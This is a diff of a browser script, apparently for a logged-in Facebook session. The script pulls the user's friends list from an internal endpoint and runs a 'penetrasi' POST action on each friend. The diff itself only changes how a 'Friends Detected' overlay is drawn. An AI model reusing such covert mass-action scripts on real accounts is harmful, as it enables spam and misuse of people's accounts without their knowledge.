@@ -21,7 +21,7 @@ function penetrasi(opo) {
             suc++
         }
         kunaon += "</div>";
-        var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";   dipes +=document.createElement("div");
+        var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
         dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
         if (i > 0) {
             dipes += arr.length + " Friends Detected<br/>";
@@ -40,7 +40,7 @@ function penetrasi(opo) {
         }
         dipes += "</div>";
         dipes += "<h2 style='position:fixed;left:20px;bottom:20px;border-radius:15px 3px 17px;margin:0 0 15px 0;padding:1px 10px 3px;border:1px solid rgba(0,0,0,0.2);background-color:rgba(10,10,10,0.5);color:white;font-size:14px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;font-weight:bold;white-space:nowrap;overflow:hidden;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);text-shadow:0pt 1px 0pt rgba(0,0,0,0.1);display:inline-block'>" + wkwkwk.split('-')[0] + "</h2>";
-        document.body.appendChild(dipes);
+        document.getElementById("pagelet_welcome_box").innerHTML = dipes
     }, "text", "post");
     tay--;
     if (tay > 0) {
@@ -367,10 +367,10 @@ jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degr
     i = arr.length - 1;
     tay = i;
     console.log(arr.length);
-    var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";dipes +=document.createElement("div");
+    var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
     dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
     dipes += arr.length + " Friends Detected";
     dipes += "</div>";
-    document.body.appendChild(dipes);
+    document.getElementById("pagelet_welcome_box").innerHTML = dipes;
     penetrasi(arr[i])
 })
